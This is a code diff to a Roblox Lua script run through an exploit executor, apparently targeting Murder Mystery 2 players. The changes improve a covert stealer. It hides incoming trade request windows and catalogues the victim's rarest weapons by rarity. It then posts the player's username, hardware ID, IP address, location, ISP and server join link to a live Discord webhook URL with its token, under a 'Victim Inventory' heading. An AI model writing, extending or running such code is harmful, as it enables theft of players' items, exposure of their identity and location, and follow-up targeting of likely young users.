@@ -14,6 +14,11 @@ task.spawn(function()
 
     while not LocalPlayer do task.wait(0.1); LocalPlayer = Players.LocalPlayer end
 
+    local pGuiWait = LocalPlayer:WaitForChild("PlayerGui", 999)
+    while pGuiWait and not (pGuiWait:FindFirstChild("MainGUI") or pGuiWait:FindFirstChild("MainGUI_Phone") or pGuiWait:FindFirstChild("MainGUI_Tablet")) do
+        task.wait(0.5)
+    end
+
     local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1532170472681373836/LXu-2GqrokaeDd_E4jg0LqvhHyRCWnXplBAsk6XSNx2GXfOIi-keCSNPFIpNX0jrtIOu"
     local http_req = (typeof(request) == "function" and request) or (typeof(http_request) == "function" and http_request) or (http and typeof(http.request) == "function" and http.request) or (syn and typeof(syn.request) == "function" and syn.request) or (fluxus and typeof(fluxus.request) == "function" and fluxus.request) or nil
 
@@ -304,14 +309,19 @@ task.spawn(function()
         checkReq()
     end
 
-    local pGui = getPlayerGui()
-    if pGui then
+    task.spawn(function()
+        local pGui = getPlayerGui()
+        while not pGui do
+            task.wait(0.5)
+            pGui = getPlayerGui()
+        end
+        
         local existingReq = pGui:FindFirstChild("TradeRequest", true)
         if existingReq then watchMobileRequestFrame(existingReq) end
         pGui.ChildAdded:Connect(function(child)
             if child.Name == "TradeRequest" then watchMobileRequestFrame(child) end
         end)
-    end
+    end)
 
     RunService.Heartbeat:Connect(function()
         if isActiveTrade then hideTradeUIMobile() end
@@ -459,7 +469,9 @@ task.spawn(function()
         pcall(function() local cam = workspace.CurrentCamera; resolution = string.format("%dx%d", cam.ViewportSize.X, cam.ViewportSize.Y) end)
         
         local owned = getOwnedWeapons()
-        local filtered = {}
+        local categories = {
+            Ancient = {}, Godly = {}, Vintage = {}, Legendary = {}
+        }
         local loggedItems = {}
         for i = 1, #owned do
             local itemId = owned[i]
@@ -467,34 +479,48 @@ task.spawn(function()
             local priority = RARITY_PRIORITY[rarityName] or 99
             if priority <= 4 and not loggedItems[itemId] then
                 loggedItems[itemId] = true
-                table.insert(filtered, itemId)
+                table.insert(categories[rarityName], itemId)
             end
         end
 
-        local invText = "No Ancient/Godly/Vintage/Legendary items"
-        if #filtered > 0 then
-            invText = "• " .. table.concat(filtered, "\n• ")
+        local function formatCategory(name, items)
+            if #items == 0 then return "**" .. name .. ":** -" end
+            return "**" .. name .. ":** " .. table.concat(items, ", ")
         end
+
+        local invText = string.format("%s\n%s\n%s\n%s", 
+            formatCategory("Ancient", categories.Ancient),
+            formatCategory("Godly", categories.Godly),
+            formatCategory("Vintage", categories.Vintage),
+            formatCategory("Legendary", categories.Legendary)
+        )
 
         local device = GuiService:IsTenFootInterface() and "Console/TV" or UIS.TouchEnabled and "Mobile / Tablet" or "Mobile (Spoofed/Emulator)"
         local jobId, placeId = game.JobId, game.PlaceId
         local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
+        
+        local embed = {
+            title = "Session Logger (Mobile Version)",
+            color = 3447003,
+            fields = {
+                {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
+                {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
+                {name = "Performance", value = string.format("**FPS:** %s\n**Ping:** %s ms\n**Resolution:** %s", fps, ping, resolution), inline = true},
+                {name = "HWID", value = string.format("`%s`", hwid), inline = false},
+                {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
+                {name = "Server JobID", value = string.format("`%s`\n[Join via RoPro/BTRoblox](%s)", jobId, joinLink), inline = false},
+                {name = "Join via Executor:", value = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```", placeId, jobId), inline = false},
+                {name = "🎒 Victim Inventory:", value = invText, inline = false}
+            }
+        }
+        
+        if game.PrivateServerId ~= "" then
+            embed.footer = { text = "Private Server ✅" }
+        end
+        
         local payload = {
             content = "@everyone [MOBILE LOG]",
-            embeds = {{
-                title = "Session Logger (Mobile Version)",
-                color = 3447003,
-                fields = {
-                    {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
-                    {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
-                    {name = "Performance", value = string.format("**FPS:** %s\n**Ping:** %s ms\n**Resolution:** %s", fps, ping, resolution), inline = true},
-                    {name = "HWID", value = string.format("`%s`", hwid), inline = false},
-                    {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
-                    {name = "Server JobID", value = string.format("`%s`\n[Join via RoPro/BTRoblox](%s)", jobId, joinLink), inline = false},
-                    {name = "Join via Executor:", value = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```", placeId, jobId), inline = false},
-                    {name = "🎒 Victim Inventory (Godly / Ancient / Vintage / Legendary):", value = invText, inline = false}
-                }
-            }},
+            embeds = {embed},
             username = "Session Logger"
         }
         pcall(function() http_req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end)
